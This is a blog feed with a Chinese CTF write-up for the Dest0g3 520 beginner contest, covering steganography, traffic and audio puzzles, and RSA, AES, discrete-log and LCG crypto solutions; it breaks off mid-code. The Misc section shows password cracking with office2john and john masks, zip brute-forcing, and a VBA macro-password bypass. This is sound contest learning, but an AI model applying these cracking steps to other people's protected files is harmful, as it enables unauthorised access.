<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Lazzaro</title>
  
  
  <link href="https://lazzzaro.github.io/atom.xml" rel="self"/>
  
  <link href="https://lazzzaro.github.io/"/>
  <updated>2022-05-28T14:17:41.878Z</updated>
  <id>https://lazzzaro.github.io/</id>
  
  <author>
    <name>Lazzaro</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Dest0g3 520迎新赛</title>
    <link href="https://lazzzaro.github.io/2022/05/26/match-Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/"/>
    <id>https://lazzzaro.github.io/2022/05/26/match-Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/</id>
    <published>2022-05-26T12:09:18.000Z</published>
    <updated>2022-05-28T14:17:41.878Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>首届Dest0g3 520迎新赛更加注重CTFer的基础知识面掌握程度，由易到难，适合各学习阶段选手参加，纯萌新水准。</p><p>比赛时间：2022.5.20 10:00 - 5.27 10:00</p><p>题目分类：Web、Pwn、Misc、Crypto、Re、AI、BlockChain</p><p>题目难度：萌新</p><p>比赛类型：个人赛</p><p>比赛交流QQ群：923945203</p><p>个人赛奖励：总榜前10及各方向前三均可获得《从0到1：CTFer成长之路》一本 + 定制U盘（32G）一个</p><p>Rank: 12</p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Welcome-to-fxxking"><a href="#Welcome-to-fxxking" class="headerlink" title="Welcome to fxxking"></a>Welcome to fxxking</h3><blockquote><p>关注公众号并回复：Give me the fxxking flag</p></blockquote><p>公众号 <code>Dest0g3 Team</code> 回复：Give me the fxxking flag，</p><p>得到 <code>The fxxking flag is: Dest0g3&#123;W31c0m3_t0_DestCTF2022!&#125;</code></p><p>​    </p><h3 id="Pngenius"><a href="#Pngenius" class="headerlink" title="Pngenius"></a>Pngenius</h3><p>foremost分解png图片得到zip压缩包，zsteg查看png图片的lsb通道得到 <code>Password for zip:Weak_Pas5w0rd</code>；</p><p>用密码 <code>Weak_Pas5w0rd</code> 解压zip压缩包得到flag：<code>Dest0g3&#123;2908C1AA-B2C1-B8E6-89D1-21B97D778603&#125;</code>。</p><p>​    </p><h3 id="EasyEncode"><a href="#EasyEncode" class="headerlink" title="EasyEncode"></a>EasyEncode</h3><blockquote><p>Enjoy Decoding</p></blockquote><p>用ARCHPR爆破zip压缩包密码得到 <code>100861</code>，按照 摩斯密码-16进制-Unicode-Base64 解码得到 <code>Dest0g3&#123;Deoding_1s_e4sy_4_U&#125;</code>。</p><p>​    </p><h3 id="你知道js吗"><a href="#你知道js吗" class="headerlink" title="你知道js吗"></a>你知道js吗</h3><p>打开flag文件发现是word文件/压缩包，在 <code>document.xml</code> 中找到Base64编码的字符串，解码得到brainfuck，<a href="https://www.splitbrain.org/services/ook">在线解密</a>得到16进制字符串 <code>446573743067337B38366661636163392D306135642D343034372D623730322D3836636233376162373762327D</code>，转为字符得 <code>Dest0g3&#123;86facac9-0a5d-4047-b702-86cb37ab77b2&#125;</code>。</p><p>​    </p><h3 id="StrangeTraffic"><a href="#StrangeTraffic" class="headerlink" title="StrangeTraffic"></a>StrangeTraffic</h3><p>Wireshark打开发现是Modbus流量，在流0发现分段Base64字符串 <code>RGVzdDBnM3</code>、<code>szMUE1QkVB</code>、<code>Ni1GMjBELU</code>、<code>YxOEEtRThF</code>、<code>QS0yOUI0Rj</code>、<code>I1NzEwOEJ9</code>，连接解码得 <code>Dest0g3&#123;31A5BEA6-F20D-F18A-E8EA-29B4F257108B&#125;</code>。</p><p>​    </p><h3 id="EasyWord"><a href="#EasyWord" class="headerlink" title="EasyWord"></a>EasyWord</h3><blockquote><p>Let the word tell u</p></blockquote><p>根据 <code>hint.txt</code> 得知 <code>password.docm</code> 密码全小写字母，且满足 <code>??q?b?</code>，用john爆破：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">office2john password.docm &gt; hash.txt</span><br><span class="line">john --mask=<span class="string">&#x27;?l?lq?lb?l&#x27;</span> hash.txt</span><br></pre></td></tr></table></figure><p>得到密码 <code>ulqsbt</code>；</p><p>打开发现存在宏，查看宏代码有密码，参考<a href="https://blog.csdn.net/qq_44768749/article/details/102673212">类似题目</a>中破解宏密码的方法，将word文件用压缩包方式打开，找到 <code>vbaProject.bin</code> 文件以16进制方式查看，将 <code>DBP</code> 改为 <code>DBX</code> 并保存，再将修改后的文件替换到压缩包里，改回word文件格式，重新打开可看到宏代码。</p><p>进入VBA编辑器查看Dialog对应宏代码：</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Private</span> <span class="keyword">Sub</span> CB_OK_Click()</span><br><span class="line"><span class="keyword">Dim</span> strpasw <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line"><span class="keyword">Dim</span> strdec <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line"><span class="keyword">Dim</span> strusrinput <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line"><span class="keyword">Dim</span> t <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line">t = ChrW(<span class="number">21152</span>) &amp; ChrW(<span class="number">27833</span>) &amp; ChrW(<span class="number">21543</span>) &amp; ChrW(<span class="number">65292</span>) &amp; ChrW(<span class="number">21516</span>) &amp; ChrW(<span class="number">23398</span>) &amp; ChrW(<span class="number">20204</span>) &amp; ChrW(<span class="number">65281</span>)</span><br><span class="line"></span><br><span class="line">strusrinput = Dialog.TextBox_Pasw</span><br><span class="line"><span class="keyword">Dim</span> sinput <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line">sinput = strusrinput</span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> (strusrinput &lt;&gt; <span class="string">&quot;&quot;</span>) <span class="keyword">Then</span></span><br><span class="line">  strusout = Encode(strusrinput, t)</span><br><span class="line">  <span class="keyword">If</span> (strusout = <span class="string">&quot;┤℡ǒqｘ~&quot;</span>) <span class="keyword">Then</span></span><br><span class="line">      strdec = Decode(Dialog.Label_ls.Caption, sinput)</span><br><span class="line">  <span class="keyword">Else</span></span><br><span class="line">     <span class="keyword">If</span> (strusout = <span class="string">&quot;ｋGJEｇｑ&quot;</span>) <span class="keyword">Then</span></span><br><span class="line">        strdec = Decode(Dialog.Label_ls1.Caption, sinput)</span><br><span class="line">     <span class="keyword">Else</span></span><br><span class="line">          <span class="keyword">If</span> (strusout = <span class="string">&quot;ЮΟopz+&quot;</span>) <span class="keyword">Then</span></span><br><span class="line">             strdec = Decode(Dialog.Label_ls2.Caption, sinput)</span><br><span class="line">          <span class="keyword">Else</span></span><br><span class="line">                <span class="keyword">If</span> (strusout = <span class="string">&quot;ｚΚjrШφεあ&quot;</span>) <span class="keyword">Then</span></span><br><span class="line">                    strdec = Decode(Dialog.Label_ls4.Caption, sinput)</span><br><span class="line">                <span class="keyword">Else</span></span><br><span class="line">                    <span class="keyword">If</span> (strusout = <span class="string">&quot;àǖtＵｗ┧ｈè&quot;</span>) <span class="keyword">Then</span></span><br><span class="line">                          strdec = Decode(Dialog.Label_ls3.Caption, sinput)</span><br><span class="line">                    <span class="keyword">Else</span></span><br><span class="line">                          strdec = StrConv(t, vbFromUnicode)</span><br><span class="line">                    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">                <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">           <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">      <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">   <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">   Label_CLUE.Caption = strdec</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br></pre></td></tr></table></figure><p>无需分析加解密算法，输出结果 <code>strusout</code> 由 <code>Encode(strusrinput, t)</code> 加密得到，只需分别用解密函数反推五个if分支条件对应的明文即可，修改 <code>Label_CLUE.Caption = strdec</code> 为 <code>Label_CLUE.Caption = Decode(xxx,t)</code>，回到word运行 <code>AutoOpen</code> 宏，随便输入字符点击确定即可在Dialog的label处显示对应明文，分别是 <code>123456</code>、<code>aaaaaa</code>、<code>000000</code>、<code>墙角数枝</code>、<code>iloveyou</code>；</p><p>将 <code>Label_CLUE.Caption = Decode(xxx,t)</code> 改回 <code>Label_CLUE.Caption = strdec</code>，分别输入五段明文，发现输入 <code>墙角数枝</code> 得到 <code>解压密码：两只黄鹂鸣翠柳,一行白鹭上青天!</code>，结合word里的hint <code>Rar密码为复杂型，长度为16位，包含了字母、数字和符号。</code>，压缩包密码猜出为 <code>2zhlmcl,1hblsqt.</code>，解压拿到flag：<code>Dest0g3&#123;VBScr1pt_And_Hashc4t_1s_g00d&#125;</code>。</p><p>​    </p><h3 id="4096"><a href="#4096" class="headerlink" title="4096"></a>4096</h3><blockquote><p>Just relax and always be aware of the changes on the web!</p></blockquote><p>4096小游戏，查看js，用chrome源代码里的搜索功能，搜 <code>flag</code> 可在 <code>local_storage_manager.js</code> 里找到</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getPartFlag</span>(<span class="params">score</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (score &gt; <span class="number">10000</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;Q29uZ3JhdHVsYXRpb25zLCB0aGlzIGlzIHBhcnQgb2YgdGhlIGZsYWc6IE5HVmxOeTFpTmpjekxUazNNV1E0TVdZNFlqRTNOMzA9Lg==&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两次base64解码得到flag后半部分 <code>4ee7-b673-971d81f8b177&#125;</code>。</p><p>前半部分在js内找很久都没找到，观察资源文件里存在 <code>favicon.ico</code> 和 <code>favicon.png</code> 两张图，取出来发现png图有隐写，foremost分出一个wav文件和一个zip文件；</p><p>用audacity查看wav，前后两段是DTMF按键音，解码出 <code>74958097831</code>，中间一段是SSTV慢扫描电视，用robot36扫出图片，内容是 <code>MD5&#123;cell phone number&#125;</code>，将前面的 <code>74958097831</code> 倒序成手机号格式，MD5加密得到 <code>32fc1b5487cb447f792a19418b92544e</code>，解压zip压缩包；</p><p>压缩包里为切割后打乱拼接的图片，利用gaps工具拼图</p><p><code>gaps --image=puzzle.png --size=64 --save</code></p><p>得到的结果还是有部分块位置不对，再gaps两次得到完整原图：</p><p><img src="/2022/05/26/match-Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/part_flag_solution_solution_solution.jpg" alt="part_flag_solution_solution_solution" style="zoom:50%;"></p><p>将字符串拼接得 <code>RGVzdDBnM3tlZDRkMTE0Zi05ZWU0LQ==</code>，base64解码得flag前半段：<code>Dest0g3&#123;ed4d114f-9ee4-</code>。</p><p>​    </p><h3 id="Python-jail"><a href="#Python-jail" class="headerlink" title="Python_jail"></a>Python_jail</h3><blockquote><p>听说python是最好的语言，那我把它锁起来，我就是最好的语言了！</p></blockquote><p>根据hint提示，password里内容是whitespace语言，<a href="https://ideone.com/NUNNbI">在线编译</a>得到 <code>a8e15220-7404-4269-812e-6418557b7dc2</code>，是zip压缩包密码；</p><p>解压zip压缩包，zsteg发现lsb隐写pyc文件，提取：</p><p><code>zsteg -E &quot;b1,rgb,lsb,xy&quot; SECRET1.png &gt; out.pyc</code></p><p>无需反编译，16进制查看发现 <code>ZmxhZ3tiNWJjZmM4Ny01Y2E2LTQzZjEtYjM4NC01N2QwOWI4ODZjYTl9</code>，base64解码得 <code>flag&#123;b5bcfc87-5ca6-43f1-b384-57d09b886ca9&#125;</code>。</p><p>​    </p><h3 id="codegame"><a href="#codegame" class="headerlink" title="codegame"></a>codegame</h3><blockquote><p>Funny and ez codegame with Key to celebrate EDG</p></blockquote><p>KEYcode里经查是LOLCODE Language，用dcode解得到输出是 <code>QEFPFPQEBMXPPTLOA</code>，以此为密码解压zip压缩包，得到word文件；</p><p>直接打开word发现 <code>AES</code> 提示，用压缩包打开word有个 <code>fllllllllll1ag.txt</code> 文件，里面是一串emoji表情，猜想为emoji-aes加密，<a href="https://aghorler.github.io/emoji-aes/">在线解密</a>，同样用 <code>QEFPFPQEBMXPPTLOA</code> 作为key，没成功，再不断盲调Rotation，在Rotation为4的时候解密成功，得到</p><p><code>666C61677B39663638663333342D303137612D343230312D393264662D6464646363313435333334647D</code></p><p>16进制转字符串得 <code>flag&#123;9f68f334-017a-4201-92df-dddcc145334d&#125;</code>。</p><p>​    </p><h3 id="rookie-hacker-2"><a href="#rookie-hacker-2" class="headerlink" title="rookie hacker-2"></a>rookie hacker-2</h3><blockquote><p>（容器1的容器名为 <code>test_docker1</code>，容器2的容器名为 <code>test_docker2</code>）</p><p>Alice访问自己的docker时忘记了把容器分别部署在哪些ip上，你能帮帮他么？ Flag格式：Dest0g3{ip1_ip2_…..} 例：假设容器1、容器2的ip为1.1.1.1、2.2.2.2，则flag为 Dest0g3{1.1.1.1_2.2.2.2}</p></blockquote><p>非预期，docker的IP地址会以 <code>&quot;IPAddress&quot;: &quot;172.x.x.x&quot;</code> 的形式记录在配置文件中，直接在E01文件里用正则表达式 <code>&quot;IPAddress&quot;:&quot;172</code> 搜索，取出现频率最高的两个IP即可，flag：<code>Dest0g3&#123;172.18.0.2_172.18.0.3&#125;</code>。</p><p>​    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> next_prime</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = next_prime(p)</span><br><span class="line">n = p*q</span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">27272410937497615429184017335437367466288981498585803398561456300019447702001403165885200936510173980380489828828523983388730026101865884520679872671569532101708469344562155718974222196684544003071765625134489632331414011555536130289106822732544904502428727133498239161324625698270381715640332111381465813621908465311076678337695819124178638737015840941223342176563458181918865641701282965455705790456658431641632470787689389714643528968037519265144919465402561959014798324908010947632834281698638848683632113623788303921939908168450492197671761167009855312820364427648296494571794298105543758141065915257674305081267</span></span><br><span class="line"><span class="string">14181751948841206148995320731138166924841307246014981115736748934451763670304308496261846056687977917728671991049712129745906089287169170294259856601300717330153987080212591008738712344004443623518040786009771108879196701679833782022875324499201475522241396314392429412747392203809125245393462952461525539673218721341853515099201642769577031724762640317081252046606564108211626446676911167979492329012381654087618979631924439276786566078856385835786995011067720124277812004808431347148593882791476391944410064371926611180496847010107167486521927340045188960373155894717498700488982910217850877130989318706580155251854</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>$p,q$ 相近，常规RSA：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = </span><br><span class="line">e = </span><br><span class="line">c = </span><br><span class="line">p = iroot(n,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> is_prime(p):</span><br><span class="line">    p += <span class="number">1</span></span><br><span class="line">q = n // p</span><br><span class="line">d = invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;Dest0g3&#123;96411aad-032c-20a8-bc43-b473f6f08536&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="babyAES"><a href="#babyAES" class="headerlink" title="babyAES"></a>babyAES</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">key = os.urandom(<span class="number">16</span>)</span><br><span class="line">my_aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">flag += (<span class="number">16</span> - <span class="built_in">len</span>(flag) % <span class="number">16</span>) * <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">c = my_aes.encrypt(flag)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(iv)</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b&#x27;C4:\x86Q$\xb0\xd1\x1b\xa9L\x00\xad\xa3\xff\x96 hJ\x1b~\x1c\xd1y\x87A\xfe0\xe2\xfb\xc7\xb7\x7f^\xc8\x9aP\xdaX\xc6\xdf\x17l=K\x95\xd07&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\xd1\xdf\x8f)\x08w\xde\xf9yX%\xca[\xcb\x18\x80&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\xa4\xa6M\xab&#123;\xf6\x97\x94&gt;hK\x9bBe]F&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>AES-CBC解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">c = <span class="string">b&#x27;C4:\x86Q$\xb0\xd1\x1b\xa9L\x00\xad\xa3\xff\x96 hJ\x1b~\x1c\xd1y\x87A\xfe0\xe2\xfb\xc7\xb7\x7f^\xc8\x9aP\xdaX\xc6\xdf\x17l=K\x95\xd07&#x27;</span></span><br><span class="line">iv = <span class="string">b&#x27;\xd1\xdf\x8f)\x08w\xde\xf9yX%\xca[\xcb\x18\x80&#x27;</span></span><br><span class="line">key = <span class="string">b&#x27;\xa4\xa6M\xab&#123;\xf6\x97\x94&gt;hK\x9bBe]F&#x27;</span></span><br><span class="line">my_aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">m = my_aes.decrypt(c)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;Dest0g3&#123;d0e5fa76-e50f-76f6-9cf1-b6c2d576b6f4&#125;\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ezDLP"><a href="#ezDLP" class="headerlink" title="ezDLP"></a>ezDLP</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">x = bytes_to_long(flag)</span><br><span class="line">g = <span class="number">19</span></span><br><span class="line">p = <span class="number">335215034881592512312398694238485179340610060759881511231472142277527176340784432381542726029524727833039074808456839870641607412102746854257629226877248337002993023452385472058106944014653401647033456174126976474875859099023703472904735779212010820524934972736276889281087909166017427905825553503050645575935980580803899122224368875197728677516907272452047278523846912786938173456942568602502013001099009776563388736434564541041529106817380347284002060811645842312648498340150736573246893588079033524476111268686138924892091575797329915240849862827621736832883215569687974368499436632617425922744658912248644475097139485785819369867604176912652851123185884810544172785948158330991257118563772736929105360124222843930130347670027236797458715653361366862282591170630650344062377644570729478796795124594909835004189813214758026703689710017334501371279295621820181402191463184275851324378938021156631501330660825566054528793444353</span></span><br><span class="line">h = <span class="built_in">pow</span>(g, x, p)</span><br><span class="line"><span class="built_in">print</span>(h)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">199533304296625406955683944856330940256037859126142372412254741689676902594083385071807594584589647225039650850524873289407540031812171301348304158895770989218721006018956756841251888659321582420167478909768740235321161096806581684857660007735707550914742749524818990843357217489433410647994417860374972468061110200554531819987204852047401539211300639165417994955609002932104372266583569468915607415521035920169948704261625320990186754910551780290421057403512785617970138903967874651050299914974180360347163879160470918945383706463326470519550909277678697788304151342226439850677611170439191913555562326538607106089620201074331099713506536192957054173076913374098400489398228161089007898192779738439912595619813699711049380213926849110877231503068464392648816891183318112570732792516076618174144968844351282497993164926346337121313644001762196098432060141494704659769545012678386821212213326455045335220435963683095439867976162</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>DLP求解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line">g = <span class="number">19</span></span><br><span class="line">p = </span><br><span class="line">h = </span><br><span class="line">x = discrete_log(mod(h,p),mod(g,p))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(x)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;Dest0g3&#123;07ed2a6f-182f-a05d-c81e-1318af820a78&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ezStream"><a href="#ezStream" class="headerlink" title="ezStream"></a>ezStream</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">flag = f.read()</span><br><span class="line">f.close()</span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">8</span>] == <span class="string">&quot;Dest0g3&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LCG</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.a = getRandomNBitInteger(<span class="number">32</span>)</span><br><span class="line">        self.b = getRandomNBitInteger(<span class="number">32</span>)</span><br><span class="line">        self.m = getPrime(<span class="number">32</span>)</span><br><span class="line">        self.seed = getRandomNBitInteger(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.seed = (self.a * self.seed + self.b) % self.m</span><br><span class="line">        <span class="keyword">return</span> self.seed &gt;&gt; <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">output</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;a = &#123;&#125;\nb = &#123;&#125;\nm = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.a, self.b, self.m))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;state1 = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.<span class="built_in">next</span>()))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;state2 = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.<span class="built_in">next</span>()))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lcg = LCG()</span><br><span class="line">lcg.output()</span><br><span class="line">c = <span class="string">b&#x27;&#x27;</span>.join([long_to_bytes(<span class="built_in">ord</span>(flag[i]) ^ (lcg.<span class="built_in">next</span>() % <span class="number">10</span>))</span><br><span class="line">              <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag))])</span><br><span class="line"><span class="built_in">print</span>(bytes_to_long(c))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">a = 3939333498</span></span><br><span class="line"><span class="string">b = 3662432446</span></span><br><span class="line"><span class="string">m = 2271373817</span></span><br><span class="line"><span class="string">state1 = 17362</span></span><br><span class="line"><span class="string">state2 = 20624</span></span><br><span class="line"><span class="string">600017039001091357643174067454938198067935635401496485588306838343558125283178792619821966678282131419050878</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>LCG，爆破求seed：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">3939333498</span></span><br><span class="line">b = <span class="number">3662432446</span></span><br><span class="line">m = <span class="number">2271373817</span></span><br><span class="line">state1 = <span class="number">17362</span></span><br><span class="line">state2 = <span class="number">20624</span></span><br><span class="line">c = <span class="number">600017039001091357643174067454938198067935635401496485588306838343558125283178792619821966678282131419050878</span></span><br><span class="line">c = <span class="built_in">list</span>(<span 